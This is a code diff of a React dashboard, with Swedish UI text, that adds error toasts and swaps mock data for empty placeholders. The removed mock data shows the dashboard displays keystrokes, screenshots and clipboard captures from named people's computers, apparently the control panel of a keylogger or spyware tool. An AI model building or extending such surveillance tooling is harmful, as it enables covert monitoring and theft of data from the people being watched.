@@ -1,5 +1,4 @@
-
-import React, { useState, useEffect } from "react";
+import React from "react";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { ScrollArea } from "@/components/ui/scroll-area";
 import { Table, TableHeader, TableRow, TableHead, TableBody, TableCell } from "@/components/ui/table";
@@ -11,56 +10,40 @@ import { StorageWidget } from "@/components/dashboard/StorageWidget";
 import { ActivityChart } from "@/components/dashboard/ActivityChart";
 import { RecentActivityWidget } from "@/components/dashboard/RecentActivityWidget";
 import { Badge } from "@/components/ui/badge";
+import { toast } from "sonner";
 
 const fetchDashboardData = async () => {
-  // Exempel på hur data skulle hämtas från servern
-  // I en verklig implementation skulle detta anropa API:er från Python servern
-  const response = await fetch('/api/dashboard');
-  if (!response.ok) {
-    throw new Error('Failed to fetch dashboard data');
+  try {
+    const response = await fetch('/api/dashboard');
+    if (!response.ok) {
+      throw new Error('Failed to fetch dashboard data');
+    }
+    return await response.json();
+  } catch (error) {
+    toast.error("Kunde inte hämta dashboard-data");
+    throw error;
   }
-  return response.json();
 };
 
 export default function Dashboard() {
   const { data, isLoading, error } = useQuery({
     queryKey: ['dashboardData'],
     queryFn: fetchDashboardData,
-    // För utveckling kan vi använda mockad data om API inte existerar ännu
     placeholderData: {
-      totalClients: 8,
-      activeClients: 5,
-      totalLogs: 1243,
-      storageUsed: "32.5 MB",
-      latestActivity: "2023-03-21 14:35:22",
-      recentActivities: [
-        { id: 1, client: "john_laptop", type: "keystrokes", timestamp: "2023-03-21 14:35:22" },
-        { id: 2, client: "emma_desktop", type: "screenshot", timestamp: "2023-03-21 14:30:15" },
-        { id: 3, client: "david_pc", type: "clipboard", timestamp: "2023-03-21 14:28:10" }
-      ],
-      clients: [
-        { id: "john_laptop", name: "John (Laptop)", isActive: true, lastActivity: "2023-03-21 14:35:22", os: "Windows 10" },
-        { id: "emma_desktop", name: "Emma (Desktop)", isActive: true, lastActivity: "2023-03-21 14:30:15", os: "Windows 11" },
-        { id: "david_pc", name: "David (PC)", isActive: true, lastActivity: "2023-03-21 14:28:10", os: "macOS" },
-        { id: "sarah_laptop", name: "Sarah (Laptop)", isActive: true, lastActivity: "2023-03-21 14:20:05", os: "Ubuntu" },
-        { id: "alex_home", name: "Alex (Home)", isActive: true, lastActivity: "2023-03-21 14:15:48", os: "Windows 10" },
-        { id: "lisa_work", name: "Lisa (Work)", isActive: false, lastActivity: "2023-03-21 10:45:30", os: "Windows 10" },
-        { id: "mark_pc", name: "Mark (PC)", isActive: false, lastActivity: "2023-03-21 09:20:15", os: "Windows 11" },
-        { id: "julia_laptop", name: "Julia (Laptop)", isActive: false, lastActivity: "2023-03-20 17:35:22", os: "macOS" }
-      ],
-      activityData: [
-        { name: "00:00", keystrokes: 20, screenshots: 5, clipboard: 8 },
-        { name: "04:00", keystrokes: 0, screenshots: 5, clipboard: 0 },
-        { name: "08:00", keystrokes: 120, screenshots: 15, clipboard: 30 },
-        { name: "12:00", keystrokes: 200, screenshots: 20, clipboard: 45 },
-        { name: "16:00", keystrokes: 180, screenshots: 25, clipboard: 38 },
-        { name: "20:00", keystrokes: 100, screenshots: 15, clipboard: 25 }
-      ]
+      totalClients: 0,
+      activeClients: 0,
+      totalLogs: 0,
+      storageUsed: "0 B",
+      latestActivity: "-",
+      recentActivities: [],
+      clients: [],
+      activityData: []
     }
   });
 
   if (error) {
-    return <div className="p-6">Fel vid hämtning av dashboard-data: {error.message}</div>;
+    console.error("Error fetching dashboard data:", error);
+    return <div className="p-6">Fel vid hämtning av dashboard-data</div>;
   }
 
   return (
